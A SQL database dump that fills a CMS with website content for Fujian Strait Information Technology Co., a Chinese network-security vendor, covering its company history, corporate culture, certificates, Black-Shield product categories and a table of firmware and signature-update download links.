INSERT INTO `xyh_block` VALUES ('1','Introduction','','<p>网络科技有限公司成立于2007年。是一家集科研、生产、开发、销售为一体的互联网产业高新技术企业。 我公司在全国与多个大型门户网站保持密切技术合作与往来；并且与全国多所高校合作，开发与研究互联网深度产品，取得了不错的研究成果，获得良好的好评</p>','3');


# 转存表中的数据：xyh_category 
INSERT INTO `xyh_category` VALUES ('2','安全产品','Product','','0','13','0','','','','','List_new.html','Show_new.html','','1','3','');
INSERT INTO `xyh_category` VALUES ('16','大 事 记','Events','/public/home/default/img/introduce/introduce04.png','11','27','0','','','海峡信息大事记','','List_event.html','Show_article.html','2017-6#海峡信息以“黑盾--安全缔造信息未来 ”为主题，携互联网应用安全态势感知系统、数据库安全治理平台、十万兆级高性能安全网关、基于国产CPU芯片组的安全设备等四款创新产品闪耀亮相第十五届中国•海峡项目成果交易会#2016-11#公司建设运营的“福建省海峡软件应用安全公共服务平台”成功入选福建省互联网经济重点公共服务平台，成为省财政扶持建设项目中信息网络空间安全方向的唯一重点资质对象。#2016-7#公司成功入选“福建省科技小巨人领军企业”#2016-6#公司项目黑盾数据库安全审计系统荣获“福建省科学技术进步奖三等奖”#2015-12#公司联合福建师大成功举办“黑盾杯”福建省大学生网络与信息安全竞赛”#2015-6#获得国家信息安全服务资质（安全工程二级）#2012-12#通过国家信息安全管理体系认证。#2011-4#获准筹建“福建省信息网络安全软件公共技术服务平台”#2010-12#获准筹建“福建省信息网络安全企业工程技术研究中心”并于二零一二年正式获得认定#2010-7#获“福建省创新型企业”认定#2009#获得“福建省软件技术研发中心” 荣誉称号，开始向省外拓展市场，并陆续在江西、安徽、湖北、湖南、陕西、甘肃、北京、江苏、河南等地成立办事处#2008-4#与中科院高能物理研究所签订“信息安全领域的战略合作协议”#2007#开始成为福建省信息安全领域销量和市场占有率排名第一的网络安全公司。同时黑盾品牌成为福州市知名商标以及福建省著名商标。黑盾产品成为名优地产品。#2006-8#通过ISO质量管理体系认证。#2006-5#获得国家信息安全测评中心《信息安全服务资质证书》（安全工程类一级）#2005#开始在福建省内设立泉州、厦门、三明、漳州、龙岩五个办事处#2002#研发的黑盾网络入侵检测系统2.0”荣获北京赛迪评测“技术创新”奖以及-度精品奖、同时荣获二零零二度中国计算机用户协会信息安全分会颁发的“用户推荐产品”奖，期间公司相继获得软件企业认证以及高新技术企业认证#2000#推出黑盾防火墙产品#1999-12#“福建省海峡科技信息中心”改制成为福建省科技信息研究所控股、员工参股的“福建省海峡信息技术有限公司” 期间与中科院高能所合作开发了网威“火眼”漏洞扫描系统，创建了“北京中科网威信息技术有限公司”并成功融资。”#1996#启动福建省信息网络重点实验室建设#1993#公司前身“福建省海峡科技信息中心”成立\r\n','1','5','/public/home/default/img/introduce/introduce04.png');
INSERT INTO `xyh_category` VALUES ('5','安全服务','Service','','0','13','0','','','','','List_new.html','Show_new.html','','1','4','');
INSERT INTO `xyh_category` VALUES ('13','公司简介','Introduction','/public/home/default/img/introduce/introduce01.png','11','32','0','','','福建省海峡信息技术有限公司是福建省科技厅下属的省科技信息研究所控股、员工参股的国有企业','','List_detail.html','Show_article.html','<p><img src=\"http://www.si.net.cn/image/about_us1.gif\"/></p><p>福建省海峡信息技术有限公司是福建省科技厅下属的省科技信息研究所控股、员工参股的国有企业。其前身福建省海峡科技信息中心成立于 1993 年， 1999 年 12 月改制为福建省海峡信息技术有限公司，是 专业从事网络安全技术研发、网络安全产品销售、网络安全服务的高新技术企业、福建省软件行业协会理事单位、福建省卫生信息协会理事单位、国家商用密码产品生产定点单位，同时是福建省信息网络重点实验室的承担单位；企业还获得国家信息安全服务资质认证、 ISO 质量管理体系认证；公司自 1996 年开始研究开发网络安全技术，自主研发的黑盾系列网络安全产品均已获得国家公安部、国家安全部、国家保密局及中国人民解放军信息安全测评认证中心的认证通过。其中“黑盾 - 网络入侵检测系统”凭借其创新的功能和优越的性能获国内外同类产品评测“技术创新奖”、“精品奖”、“技术特色奖”；“黑盾 - 网络安全智能防护系统”获福建省科技进步二等奖、“黑盾 - 防火墙” 获“用户推荐奖”。</p><p>Fujian Strait Information Technology Co., Ltd. is a high-tech corporation specialized in network security technology research and development, network security products, and network security services; it is the only company which set up the provincial key laboratory (Fujian Provincial Key Laboratory of Information Network); at the same time, it is also a member of directors of Fujian Provincial Software Industry Association. We began our network security products research in 1996, being one of the earliest high-tech corporations dealing in network security technology research and product development in China. Presently, our network security products “Black-Shield Firewall” and “Black-Shield Network Intrusion Detection System” have passed the certification of the National Ministry of Public Security, State Secrets Bureau, and the National Certification Center of Information Security Products. In 2002, the “Black-Shield Network Intrusion Detection System” won the “Technological Innovation Award” among international and domestic similar products through assessment and testing at CCID(China Market Intelligence Center) Certification Center by relying on its innovative functions and superior performance, “Editors’ Choice Award of IDS product for Year 2002”, “Editors’ Choice Award of Giga IDS Product for Year 2004”, and “Featured Giga IDS Product Award for the Year 2004”. At the same time, the “Black–Shield Network Security Intelligent Protection System” won award of Fujian Provincial Scientific and Technological Progress in June 2004; and in May 2005, the Black-Shield Firewall was appraised by Computer Security Magazine as “User’s Choice Award of Year 2005”. In May 2006, the Company won the &quot;First Class Certification in Information Security Service&quot; issued by the National Information Security Product Certification Center. In August 2006, the Company passed the Certification of ISO9001. In December 2006, the Company won the title of “Designated Production Certification of Commercial Cipher Codes” issued by the National Cipher Code Administration Bureau. In June 2007, the Black-Shield series of the Network Security products passed the Certification of the People’s Liberation Army Information Security Certification Center. The Black Shield series of products have been widely used in different institutions and industries such as government, sanitation, education, banking, telecom, public security, securities, electric power, and etc. Being the official recommended product in the “Digital Fujian” project, the “Black-Shield Firewall” has successfully participated in the network security area of Fujian Provincial Information Network for Government.</p><p>Today, Fujian Strait Information Technology Co., Ltd. has become a trusted network security solution provider. Being partners of Fuzhou University, Wuhan University and Fujian Chinese Medicine College, Fujian Strait Information Technology Co., Ltd. have stable research and development resource, fully guaranteeing continuous improvement of the Black-Shield products. We believe that, Fujian Strait Information Technology Co., Ltd. will make even greater progress in network security area.</p>','1','1','/public/home/default/img/introduce/introduce01.png');
INSERT INTO `xyh_category` VALUES ('8','行业应用解决方案','Solution','','0','13','0','','','','','List_new.html','Show_new.html','','1','5','');
INSERT INTO `xyh_category` VALUES ('9','渠道合作','Partner','','0','13','0','','','','','List_new.html','Show_new.html','','0','6','');
INSERT INTO `xyh_category` VALUES ('10','诚聘英才','Career','','0','13','0','','','','','List_new.html','Show_new.html','','1','7','');
INSERT INTO `xyh_category` VALUES ('11','关于我们','Introduction','','0','13','0','','','','','List_new.html','Show_new.html','','1','2','');
INSERT INTO `xyh_category` VALUES ('17','企业文化','Culture','/public/home/default/img/introduce/introduce03.png','11','34','0','','','核心价值观--以人为本、持续创新、安全缔造信息未来\r\n经营理念\r\n团队精神--平等、尊重、协作、务实\r\n员工品质标准','','List_culture.html','Show_article.html','<p>核心价值观――以人为本、持续创新、安全缔造信息未来</p><p>&nbsp; &nbsp; &nbsp;以人为本：</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;人力资源是企业的第一资源；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;尊重每个员工的个性发展，努力开发每个员工的潜能、帮助员工成长；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;尊重每个员工对社会和公司所作的贡献并予以公平回报；</p><p>&nbsp; &nbsp; &nbsp;持续创新：</p><p>&nbsp; &nbsp; &nbsp;• &nbsp;自主持续创新是海峡信息不断成就辉煌的不竭动力；</p><p>&nbsp; &nbsp; &nbsp;• &nbsp;创新不仅表现在技术研发领域，还包括探索新的管理模式、改进新的工作方法、</p><p>&nbsp; &nbsp; &nbsp; &nbsp;提高工作效率、合理化流程再造等；</p><p>&nbsp; &nbsp; &nbsp;• &nbsp;学习是持续创新的源动力，海峡信息努力构建学习型组织，鼓励每个员工任何</p><p>&nbsp; &nbsp; &nbsp; &nbsp;时间、任何地点、任何方式学习；&nbsp;</p><p><br/></p><p>&nbsp; 经营理念</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;为客户创造价值，以服务赢得市场；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;员工、企业、社会三者共赢；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;群策群力，追求卓越；&nbsp;</p><p><br/></p><p>&nbsp;团队精神――平等、尊重、协作、务实</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;平等：团队成员没有高低贵贱之分，只有分工不同；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;尊重：团队严谨自律，尊重他人的工作方式；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;协作：拥有统一的价值观，互信协作；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;务实：作正确的事情，注重效益；&nbsp;</p><p><br/></p><p>&nbsp;员工品质标准</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;负责任的态度；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;艰苦奋斗的精神；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;宽容的心态；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;感恩的心情；</p><p><br/></p><p>&nbsp;人才经营理念</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;人力资源是企业的第一资源；&nbsp;</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;德才兼备，德为上；唯才是举，不以学历作为人才唯一评价尺度 ；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;尊重员工、信任员工；没有不合适的员工，只有不合适的岗位；</p><p>&nbsp; &nbsp; &nbsp; • &nbsp;帮助、激励员工持续学习，让员工与企业一起成长；&nbsp;</p><p><br/></p>','1','3','/public/home/default/img/introduce/introduce03.png');
INSERT INTO `xyh_category` VALUES ('18','海峡动态','News','/public/home/default/img/introduce/introduce06.png','11','1','0','','','','','List_article.html','Show_article.html','','1','2','/public/home/default/img/introduce/introduce06.png');
INSERT INTO `xyh_category` VALUES ('19','资质荣誉','Honor','/public/home/default/img/introduce/introduce05.png','11','31','0','','','公司荣誉证书','','List_honor.html','Show_article.html','<table><tbody><tr class=\"firstRow\"><td><p><img src=\"/ueditor/php/upload/image/20170427/1493280905166705.png\"/></p>高新技术企业认定证书</td><td><p><img src=\"/ueditor/php/upload/image/20170427/1493281101754433.png\" width=\"196\" height=\"140\" title=\"高新技术企业认定证书\" alt=\"高新技术企业认定证书\"/></p>高新技术企业认定证书</td><td><p><img src=\"/ueditor/php/upload/image/20170427/1493281187763986.png\" width=\"200\" height=\"140\" title=\"黑盾抗攻击网关版权证书\" alt=\"黑盾抗攻击网关版权证书\"/></p>黑盾抗攻击网关版权证书</td></tr><tr><td><p><a href=\"http://www.si.net.cn/image/zzzs/fw3.5%E7%89%88%E6%9D%83%E8%AF%81%E4%B9%A6.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281249698836.png\" width=\"200\" height=\"138\" title=\" 黑盾防火墙3.5版权登记\" alt=\" 黑盾防火墙3.5版权登记\"/></a></p>黑盾防火墙3.5版权登记</td><td><p><a href=\"http://www.si.net.cn/image/zzzs/fw%E8%BD%AF%E4%BB%B6%E4%BA%A7%E5%93%81%E7%99%BB%E8%AE%B0.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281313135971.png\" title=\"防火墙产品软件产品登记\" alt=\"防火墙产品软件产品登记\" width=\"200\" height=\"140\"/></a></p>防火墙产品软件产品登记</td><td><p><a href=\"http://www.si.net.cn/image/zzzs/ids%E8%BD%AF%E4%BB%B6%E4%BA%A7%E5%93%81%E7%99%BB%E8%AE%B0.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281399830599.png\" title=\"IDS软件产品登记\" alt=\"IDS软件产品登记\" width=\"200\" height=\"140\"/></a></p>IDS软件产品登记</td></tr><tr><td><p><a href=\"http://www.si.net.cn/zizhirongyu8.htm\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281557108629.png\" title=\"用户推荐产品证书 \" alt=\"用户推荐产品证书 \" width=\"200\" height=\"140\"/></a></p>用户推荐产品证书</td><td><p><a href=\"http://www.si.net.cn/image/zzzs/%E5%AE%9A%E7%82%B9%E5%AF%86%E7%A0%81%E8%AE%A4%E8%AF%81.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281634216277.png\" title=\"定点密码认证证书\" alt=\"定点密码认证证书\" width=\"200\" height=\"140\"/></a></p>定点密码认证证书</td><td><p><a href=\"http://www.si.net.cn/image/zzzs/IDS%E9%94%80%E5%94%AE%E8%AE%B8%E5%8F%AF%E8%AF%81.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281700106279.png\" title=\"IDS销售许可证\" alt=\"IDS销售许可证\" width=\"200\" height=\"140\"/></a></p>IDS销售许可证</td></tr><tr><td><p><a href=\"http://www.si.net.cn/image/zzzs/hd-sms%E8%BD%AF%E4%BB%B6%E8%91%97%E4%BD%9C%E6%9D%83.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281760138045.png\" title=\"HD-SMS版权证书\" alt=\"HD-SMS版权证书\" width=\"200\" height=\"140\"/></a></p><p>HD-SMS版权证书</p><p><br/></p></td><td><p><a href=\"http://www.si.net.cn/image/zzzs/ids3.1%E7%89%88%E6%9D%83%E8%AF%81%E4%B9%A6.jpg\" target=\"_self\" style=\"text-align: -webkit-center; white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493281249698836.png\" width=\"200\" height=\"138\" title=\"IDS版权证书\" alt=\"IDS版权证书\"/></a></p>IDS版权证书</td><td><a href=\"http://www.si.net.cn/image/zzzs/%E6%B1%9F%E8%A5%BF%E4%BC%98%E7%A7%80-fw.jpg\" target=\"_self\" style=\"text-align: -webkit-center; white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493281938263698.png\" title=\"江西省信产厅防火墙推荐证书\" alt=\"江西省信产厅防火墙推荐证书\" width=\"200\" height=\"140\"/></a><p>江西省信产厅防火墙推荐证书</p></td></tr><tr><td style=\"word-break: break-all;\"><p><a href=\"http://www.si.net.cn/image/zzzs/vpn2.5%E7%89%88%E6%9D%83%E8%AF%81%E4%B9%A6.jpg\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493281249698836.png\" width=\"200\" height=\"140\" title=\"VPN2.5版权证书\" alt=\"VPN2.5版权证书\"/></a></p><p>VPN2.5版权证书</p></td><td><a href=\"http://www.si.net.cn/zizhirongyu10.htm\" target=\"_self\" style=\"white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493282024113173.png\" title=\"赛迪2004精品奖\" alt=\"赛迪2004精品奖\" width=\"200\" height=\"140\"/></a><p>赛迪2004精品奖</p></td><td width=\"1227\" valign=\"middle\" align=\"center\" style=\"word-break: break-all;\"><a href=\"http://www.si.net.cn/image/zzzs/%E6%B1%9F%E8%A5%BF%E4%BC%98%E7%A7%80%EF%BC%8DIDS.jpg\" target=\"_self\" style=\"white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493281938263698.png\" title=\"江西省信产厅IDS推荐证书\" alt=\"江西省信产厅IDS推荐证书\" width=\"200\" height=\"140\"/></a><p>江西省信产厅IDS推荐证书</p></td></tr><tr><td><p><a href=\"http://www.si.net.cn/zizhirongyu5.htm\" target=\"_self\"><img src=\"/ueditor/php/upload/image/20170427/1493282157489185.png\" title=\"技术创新证书\" alt=\"技术创新证书\" width=\"200\" height=\"285\"/></a>&nbsp;&nbsp;</p>技术创新证书</td><td><a href=\"http://www.si.net.cn/image/zzzs/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E8%B5%84%E8%B4%A82.jpg\" target=\"_self\" style=\"text-align: -webkit-center; white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493282214115893.png\" title=\"安全服务资质证书\" alt=\"安全服务资质证书\" width=\"200\" height=\"285\"/></a><p>安全服务资质证书</p></td><td width=\"1227\" valign=\"middle\" align=\"center\" style=\"word-break: break-all;\"><a href=\"http://www.si.net.cn/Upimg/20057279853555.jpg\" target=\"_self\" style=\"text-align: -webkit-center; white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493282261128759.png\" title=\"计算机安全杂志05产品推荐奖\" alt=\"计算机安全杂志05产品推荐奖\" width=\"200\" height=\"285\"/></a><p>计算机安全杂志05产品推荐奖</p></td></tr><tr><td width=\"1227\" valign=\"middle\" align=\"center\" style=\"word-break: break-all;\"><a href=\"http://www.si.net.cn/image/zzzs/ISO1.jpg\" target=\"_self\" style=\"text-align: -webkit-center; white-space: normal;\"><img src=\"http://127.0.0.1/ueditor/php/upload/image/20170427/1493282307102613.png\" title=\" 质量管理体系认证证书\" alt=\" 质量管理体系认证证书\" width=\"200\" height=\"285\"/></a><p>质量管理体系认证证书</p></td><td><br/></td><td width=\"1227\" valign=\"middle\" align=\"center\" style=\"word-break: break-all;\"><br/></td></tr></tbody></table><p><br/></p>','1','4','/public/home/default/img/introduce/introduce05.png');
INSERT INTO `xyh_category` VALUES ('21','黑盾防火墙','Firewall','/public/home/default/img/product/firewall.png','2','3','0','','','','','List_product.html','Show_product.html','','1','1','/public/home/default/img/product/firewall.png');
INSERT INTO `xyh_category` VALUES ('22','黑盾网络入侵检测系统','NIDS','/public/home/default/img/product/detection.png','2','3','0','','','','','List_product.html','Show_product.html','','1','2','/public/home/default/img/product/detection.png');
INSERT INTO `xyh_category` VALUES ('23','黑盾数据库安全审计系统','SecurityAuditSystem','/public/home/default/img/product/audit.png','2','3','0','','','','','List_product.html','Show_product.html','','1','3','/public/home/default/img/product/audit.png');
INSERT INTO `xyh_category` VALUES ('24','黑盾入侵防御系统','IPS','/public/home/default/img/product/defend.png','2','3','0','','','','','List_product.html','Show_product.html','','1','4','/public/home/default/img/product/defend.png');
INSERT INTO `xyh_category` VALUES ('25','黑盾WEB应用防护抗攻击系统','AAS','/public/home/default/img/product/webapp.png','2','3','0','','','','','List_product.html','Show_product.html','','1','5','/public/home/default/img/product/webapp.png');
INSERT INTO `xyh_category` VALUES ('26','黑盾安全网关系统','SecurityGateway','/public/home/default/img/product/gateway.png','2','3','0','','','','','List_product.html','Show_product.html','','1','6','/public/home/default/img/product/gateway.png');
INSERT INTO `xyh_category` VALUES ('27','黑盾网络安全审计系统','CMP','/public/home/default/img/product/wangluoshenji.png','2','3','0','','','','','List_product.html','Show_product.html','','1','7','/public/home/default/img/product/centralized.png');
INSERT INTO `xyh_category` VALUES ('28','黑盾VPN网关','VPNGateway','/public/home/default/img/product/vpn.png','2','3','0','','','','','List_product.html','Show_product.html','','1','8','/public/home/default/img/product/vpn.png');
INSERT INTO `xyh_category` VALUES ('29','黑盾朗易IT运维管理系统','SMF','/public/home/default/img/product/SystemManage.png','2','3','0','','','','','List_product.html','Show_product.html','','1','9','/public/home/default/img/product/SystemManage.png');
INSERT INTO `xyh_category` VALUES ('30','黑盾HD-SMS管理系统','HDSMS','/public/home/default/img/product/hdsms.png','2','3','0','','','','','List_product.html','Show_product.html','','1','10','/public/home/default/img/product/document.png');
INSERT INTO `xyh_category` VALUES ('31','黑盾安全隔离与信息交换系统','SafetyIsolation','/public/home/default/img/product/isolation.png','2','3','0','','','','','List_product.html','Show_product.html','','1','11','/public/home/default/img/product/isolation.png');
INSERT INTO `xyh_category` VALUES ('32','黑盾项目管理信息系统','InfoManager','/public/home/default/img/product/infomanager.png','2','3','0','','','','','List_product.html','Show_product.html','','1','12','/public/home/default/img/product/tampering.png');
INSERT INTO `xyh_category` VALUES ('33','黑盾运维安全网关系统','SafeGateway','/public/home/default/img/product/anquanwangguan.png','2','3','0','','','','','List_product.html','Show_product.html','','1','13','/public/home/default/img/product/panda.png');
INSERT INTO `xyh_category` VALUES ('34','产品升级服务','chanpinshengjifuwu','/public/home/default/img/product/update.png','2','2','0','','','产品名称描述操作指南更新包下载更新时间黑盾防火墙p1401 适用于p1200以上版本升级——下载黑盾安全审计系统（网络版）build 20140714 系统固件升级包下载下载黑盾安全审计系统（网络版）build 2014','','List_download.html','Show_soft.html','<table style=\"font-size: 15px; color: rgb(138, 138, 139);\"><tbody><tr class=\"firstRow\"><td>产品名称</td><td>描述</td><td>操作指南</td><td>更新包下载</td><td>更新时间</td></tr><tr><td style=\"word-break: break-all;\"><p style=\"line-height: 2em;\">黑盾防火墙</p></td><td>p1401适用于p1200以上版本升级</td><td>——</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99/HDFW-2014Q2-p1401.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾安全审计系统（网络版）</p></td><td>build 20140714&nbsp;系统固件升级包</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88%E7%BD%91%E7%BB%9C%E7%89%88%EF%BC%89/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E7%89%88%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88%E7%BD%91%E7%BB%9C%E7%89%88%EF%BC%89/NACFirmware.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾安全审计系统（网络版）</p></td><td>build 20140714&nbsp;特征库升级包</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88%E7%BD%91%E7%BB%9C%E7%89%88%EF%BC%89/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E7%89%88%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88%E7%BD%91%E7%BB%9C%E7%89%88%EF%BC%89/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E7%89%88%EF%BC%88%E7%89%B9%E5%BE%81%E5%BA%93%EF%BC%89.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾入侵检测系统（IDS）</p></td><td>build ids2013Q3&nbsp;适用于C/S版本，特征库升级包</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%EF%BC%88IPS%EF%BC%89CS%E7%89%88/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9FIDS%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%EF%BC%88IPS%EF%BC%89CS%E7%89%88/ids2013q3%E8%A7%84%E5%88%99%E5%8D%87%E7%BA%A7%E5%8C%85.zip\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾入侵防御系统（IPS）</p></td><td>build 20140929&nbsp;适用于C/S版本，特征库升级包</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88IPS%EF%BC%89CS%E7%89%88/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FCS%E7%89%88%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88IPS%EF%BC%89CS%E7%89%88/Sig_Local_5_0_3ST.zip\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾入侵防御系统（IPS）</p></td><td>build 20140618&nbsp;适用于B/S版本，特征库升级包</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88IPS%EF%BC%89BS%E7%89%88/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FBS%E7%89%88%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88IPS%EF%BC%89BS%E7%89%88/signature_ips_3_1.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾WEB应用防护系统</p></td><td>build 12285&nbsp;系统固件升级包，谨慎使用</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BEWEB%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F/%E9%BB%91%E7%9B%BEWEB%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E6%8A%97%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BEWEB%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F/HDWAF-4_0_0-T-12285.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾WEB应用防护系统</p></td><td>build 20140615&nbsp;特征库升级包</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BEWEB%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F/%E9%BB%91%E7%9B%BEWEB%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E6%8A%97%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BEWEB%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9F/waf%20policy%202014_6_15.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td><p style=\"line-height: 2em;\">黑盾安全网关系统v4.0</p></td><td>build 20140720_102002&nbsp;特征库升级包，适用于SGS-9000系列</td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9Fv4_0_HD-SGS-9000/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9FHD-SGS-9000%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.docx\">下载</a></td><td><a href=\"http://www.si.net.cn/zl-sj/%E9%BB%91%E7%9B%BE%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9Fv4_0_HD-SGS-9000/%E7%89%B9%E5%BE%81%E5%BA%93sf_pack.rar\">下载</a></td><td>2014.7.30</td></tr><tr><td rowspan=\"1\" colspan=\"5\">备注：下载资源为移动线路，部分用户下载速度可能会稍慢，请耐心等待。5x8技术服务热线：0591-87303705,87303706</td></tr></tbody></table>','1','18','/public/home/default/img/product/update.png');
